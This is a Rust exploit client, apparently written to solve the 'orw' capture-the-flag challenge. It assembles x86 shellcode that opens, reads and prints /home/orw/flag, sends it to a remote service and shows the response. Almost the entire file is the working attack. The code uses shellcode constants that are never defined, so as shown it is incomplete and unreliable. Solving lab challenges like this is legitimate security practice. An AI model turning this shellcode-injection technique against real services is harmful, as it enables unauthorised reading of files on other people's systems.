use std::net::TcpStream;
use std::io::Read;
use std::io::Write;
use std::error::Error;
use std::fs::File;
use std::env;

static LOCAL: bool = false;

// target information 
/* 
 * binary reads in shellcode and executes
 * seccomp prevents all syscalls besides open, read, write
 * no PIE, so global addresses are fixed
 */

fn parse_args(args: Vec<String>) -> String {
    if args.len() < 3 {
        panic!("Error: usage <binary> <address> <port>");
    }
    let mut addr: String = args[1].to_string().clone();
    addr.push_str(":");
    addr.push_str(&args[2]);
    return addr;
}

fn create_socket(addr: String) -> Result<TcpStream, std::io::Error> {
    let stream = TcpStream::connect(addr);
    return stream;
}

fn try_read(s: &mut TcpStream) -> (usize, [u8; 1024]) {
    let mut recvbuf = [0; 1024];
    let n = s.read(&mut recvbuf);
    match n {
        Ok(n) => return (n, recvbuf),
        Err(e) => panic!("Problem reading from server {:?}", e),
    };
}

fn try_write(s: &mut TcpStream, buf: &[u8]) -> Result<usize, std::io::Error> {
    let n = s.write(buf);
    return n;
}

fn main() -> Result<(), Box<dyn Error>> {
    let mut recvbuf: [u8; 1024];
    let mut n: usize;
    const SHELLCODE_SIZE: usize = 0xc8;
    const SHELLCODE_ADDR: u32 = 0x804a060;

    // write shellcode
    const FILENAME: &[u8; 19] = b"/////home/orw/flag\x00";
    let filename_addr: u32 = 5 + OPEN_SYSCALL.len() as u32 + 5 + 
        READ_SYSCALL.len() as u32 + WRITE_SYSCALL.len() as u32 + 
        EXIT_SYSCALL.len() as u32 + SHELLCODE_ADDR;
    let read_buffer_addr: u32 = filename_addr;
    let mut shellcode: Vec<u8> = Vec::new();
    shellcode.push(0xbb); // mov ebx, filename addr
    shellcode.extend_from_slice(&filename_addr.to_le_bytes()); 
    shellcode.extend_from_slice(OPEN_SYSCALL);
    shellcode.push(0xb9); // mov ecx, read buffer addr
    shellcode.extend_from_slice(&read_buffer_addr.to_le_bytes()); 
    shellcode.extend_from_slice(READ_SYSCALL);
    shellcode.extend_from_slice(WRITE_SYSCALL);
    shellcode.extend_from_slice(EXIT_SYSCALL);
    shellcode.extend_from_slice(FILENAME);

    println!("shellcode {:?}", shellcode);
    println!("filename addr {:#02x}, read addr {:02x}", filename_addr, read_buffer_addr);
    
    assert!(shellcode.len() <= SHELLCODE_SIZE);

    if LOCAL {
        let mut file = File::create("orw_input")?;
        file.write_all(&shellcode)?;
        Ok(())
    }
    else {
        // create read and write fds, sleep
        let args: Vec<String> = env::args().collect();
        let addr: String = parse_args(args);
        println!("Connecting to {}", addr);

        // let mut r = TcpStream::connect(addr)?;
        let mut r = create_socket(addr)?;
        let mut w = r.try_clone()?;
        std::thread::sleep(std::time::Duration::from_secs(3));

        // read initial prompt
        (n, recvbuf) = try_read(&mut r);
        eprintln!("received {} bytes: {}", n, String::from_utf8_lossy(&recvbuf[..n]));
        
        // write payload
        n = try_write(&mut w, &shellcode)?;
        eprintln!("sent {} bytes", n);
        
        // try reading response
        (n, recvbuf) = try_read(&mut r);
        eprintln!("received {} bytes: {}", n, String::from_utf8_lossy(&recvbuf[..n]));
        
        Ok(())
    }
}